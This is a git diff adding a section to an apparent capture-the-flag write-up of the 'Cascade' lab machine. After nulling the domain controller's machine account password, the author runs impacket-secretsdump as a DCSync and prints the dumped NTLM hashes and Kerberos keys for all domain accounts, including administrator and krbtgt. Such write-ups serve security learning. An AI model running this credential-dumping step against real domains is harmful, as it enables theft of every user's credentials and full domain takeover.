@@ -279,6 +279,90 @@ This set the DC machine account password to null
 Now i can do a DCSync
 
 ```python
+impacket-secretsdump -just-dc -no-pass casc-dc1\$@10.129.18.9 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+cascade.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:7c2ea40b06d267f1557a09ac086b4487:::
+cascade.local\CascGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3a1b37192392d74e86d04242288dc147:::
+cascade.local\arksvc:1106:aad3b435b51404eeaad3b435b51404ee:10ffc991edaa4635cf81eb91762420cb:::
+cascade.local\s.smith:1107:aad3b435b51404eeaad3b435b51404ee:b48b49789458698abadc119c8e310703:::
+cascade.local\r.thompson:1109:aad3b435b51404eeaad3b435b51404ee:63251f7b1bada5082e5ffb18261ba28f:::
+cascade.local\util:1111:aad3b435b51404eeaad3b435b51404ee:49a914ea7201025aeff21cd858ec7d66:::
+cascade.local\j.wakefield:1116:aad3b435b51404eeaad3b435b51404ee:13ae5d7704258917054d662d016eab60:::
+cascade.local\s.hickson:1121:aad3b435b51404eeaad3b435b51404ee:2776416ceb426c515cab11bb8411067b:::
+cascade.local\j.goodhand:1122:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::
+cascade.local\a.turnbull:1124:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::
+cascade.local\e.crowe:1127:aad3b435b51404eeaad3b435b51404ee:95d4f729c16ae37b910317d665ba2215:::
+cascade.local\b.hanson:1128:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::
+cascade.local\d.burman:1129:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::
+cascade.local\BackupSvc:1130:aad3b435b51404eeaad3b435b51404ee:c27e154566c4788326fce339f4b55491:::
+cascade.local\j.allen:1134:aad3b435b51404eeaad3b435b51404ee:64928a685f9a995045f8c04bbf86881d:::
+cascade.local\i.croft:1135:aad3b435b51404eeaad3b435b51404ee:431682a8242a237e805badacab95b0e4:::
+CASC-DC1$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WIN-RRNTVQP3YBF$:1139:aad3b435b51404eeaad3b435b51404ee:8d0289b6229a0659a6c90c96ee3846dc:::
+[*] Kerberos keys grabbed
+cascade.local\administrator:aes256-cts-hmac-sha1-96:201b2d849679d315b51959d1acd879032e1f6dba6fa9feb772a2d985edc2c2cf
+cascade.local\administrator:aes128-cts-hmac-sha1-96:5ebdd49d14c5b62141ab0e6a2780ef70
+cascade.local\administrator:des-cbc-md5:1532f8259b2c4f45
+krbtgt:aes256-cts-hmac-sha1-96:25deaf37ed42e5cd95b76850d9d76fa663fcce3a9512f31357f5e45d333ca5ea
+krbtgt:aes128-cts-hmac-sha1-96:22f5ccb8e68382406cb6e3c24c706208
+krbtgt:des-cbc-md5:fba77f5b31239d9e
+cascade.local\arksvc:aes256-cts-hmac-sha1-96:3717cd1cd9e13ac692bd99e0de0bbdd7910296f8d1f465cb559f76eb63f21bcc
+cascade.local\arksvc:aes128-cts-hmac-sha1-96:0e34dc2f704261583d5f0bfbdf4cac14
+cascade.local\arksvc:des-cbc-md5:73f2c423982534a8
+cascade.local\s.smith:aes256-cts-hmac-sha1-96:c5b64b93302ccfb91648acea44a708797371bcec306a74a42d614365329635ce
+cascade.local\s.smith:aes128-cts-hmac-sha1-96:4cc2dc914d7d971f3708dba510b1a1e9
+cascade.local\s.smith:des-cbc-md5:6be0fdeab6cec762
+cascade.local\r.thompson:aes256-cts-hmac-sha1-96:d5bf934e36dbbb73b35345f08117b844874b343c9149095ff86034172272259e
+cascade.local\r.thompson:aes128-cts-hmac-sha1-96:def0284f32bcaa0291184f0e6b2a8af0
+cascade.local\r.thompson:des-cbc-md5:89e3da3dc74576d9
+cascade.local\util:aes256-cts-hmac-sha1-96:9e74ea4fa951ebe411bb9d734c48202fd346a21e414bc61c49ff14b41ba14bb5
+cascade.local\util:aes128-cts-hmac-sha1-96:cadfed05f20d4ca27ffa30b30664dbae
+cascade.local\util:des-cbc-md5:c4a8765b4f3db901
+cascade.local\j.wakefield:aes256-cts-hmac-sha1-96:c3a6a1518a513ef2344859b204692d92adea4c78a6b8539e1743cfcbeb85dc5c
+cascade.local\j.wakefield:aes128-cts-hmac-sha1-96:134734b88534d38ce5bd786bac268f07
+cascade.local\j.wakefield:des-cbc-md5:a876678997570e6d
+cascade.local\s.hickson:aes256-cts-hmac-sha1-96:ebdd5dd6e9d0dfac16983b005db8e84b482250740bc3e64b0e58ae30f7e7a7b5
+cascade.local\s.hickson:aes128-cts-hmac-sha1-96:83b64186d9c5d8e74b44d6efa3b19ed7
+cascade.local\s.hickson:des-cbc-md5:ce8c2f9dfe3b3ddf
+cascade.local\j.goodhand:aes256-cts-hmac-sha1-96:770b3bd99ce9b17bbf3e35a839615eb1204cbae05990db83e9393a2564c2f8ed
+cascade.local\j.goodhand:aes128-cts-hmac-sha1-96:11ccc9eea5401915a46406441e50ed8f
+cascade.local\j.goodhand:des-cbc-md5:fb9226a16d94ba64
+cascade.local\a.turnbull:aes256-cts-hmac-sha1-96:4adfe6a4be270895c5a55e440e2a14d70db45f4729d82caff0c157140729f3f1
+cascade.local\a.turnbull:aes128-cts-hmac-sha1-96:89c3c86c69648eea1e589db7316710ae
+cascade.local\a.turnbull:des-cbc-md5:2c076e23493ef7ba
+cascade.local\e.crowe:aes256-cts-hmac-sha1-96:c6459e3f1647f02bd9528bca926beb8bfc944b42f3b12d9777fbdc59431fdc43
+cascade.local\e.crowe:aes128-cts-hmac-sha1-96:6d36444d8f1b1a4bda6d7c4118ed61d9
+cascade.local\e.crowe:des-cbc-md5:f445588fae23a729
+cascade.local\b.hanson:aes256-cts-hmac-sha1-96:a6071c3a20a3ce2e373e8586ef7bd12cb665eb6ee66d110df57ee9f703b528f0
+cascade.local\b.hanson:aes128-cts-hmac-sha1-96:34f9f21922871be23e9bedc3fc1741cd
+cascade.local\b.hanson:des-cbc-md5:57ef54d568d03e86
+cascade.local\d.burman:aes256-cts-hmac-sha1-96:b6a2a64a272ba6c7d2cf638b8614a370d597bc167222555ec655facca6ebfe08
+cascade.local\d.burman:aes128-cts-hmac-sha1-96:310087249254f69e0436b2113f08909e
+cascade.local\d.burman:des-cbc-md5:83313268372502c2
+cascade.local\BackupSvc:aes256-cts-hmac-sha1-96:ffba7ff6b18eba90d46d787e56a0a0ebba7c8d933f992f2b896e5c7ec7da8720
+cascade.local\BackupSvc:aes128-cts-hmac-sha1-96:854bd600cad9e7cd309eb124039b25a7
+cascade.local\BackupSvc:des-cbc-md5:9ea4d0da8cdcbcef
+cascade.local\j.allen:aes256-cts-hmac-sha1-96:56a9256363211ec2ac9ac5d64ddc931b10123bdf4ce4a90c4eee14aab91e401a
+cascade.local\j.allen:aes128-cts-hmac-sha1-96:7f03f34bc8c2919a6b6ddd22c983d23c
+cascade.local\j.allen:des-cbc-md5:a1b0c14f0ec715a8
+cascade.local\i.croft:aes256-cts-hmac-sha1-96:a26cfa25eeb98248137d57f00a509aca41a091218b5a9971ca6af7cd0552c469
+cascade.local\i.croft:aes128-cts-hmac-sha1-96:ac531c4553b8f5c2f62614d91e9864e5
+cascade.local\i.croft:des-cbc-md5:b6f89862bf854cf1
+CASC-DC1$:aes256-cts-hmac-sha1-96:512b1c0937d82f8226296d4ce7fd819dcb5f355edc5f107bacb873507fdbe518
+CASC-DC1$:aes128-cts-hmac-sha1-96:93716a94d39656950840d265c55dd8b5
+CASC-DC1$:des-cbc-md5:fd6b9b4ceaf2ef7c
+WIN-RRNTVQP3YBF$:aes256-cts-hmac-sha1-96:a6da10f4e1d7aaa44720f3dc90e57244a5499672c3fd012caa91d66ef28718ca
+WIN-RRNTVQP3YBF$:aes128-cts-hmac-sha1-96:74e529f46e3b81ca02b6aa5d4adb60c0
+WIN-RRNTVQP3YBF$:des-cbc-md5:2640269491ce6e92
+[*] Cleaning up...
+```
+I now have all the hashes
+
+```python
 
 ```
 
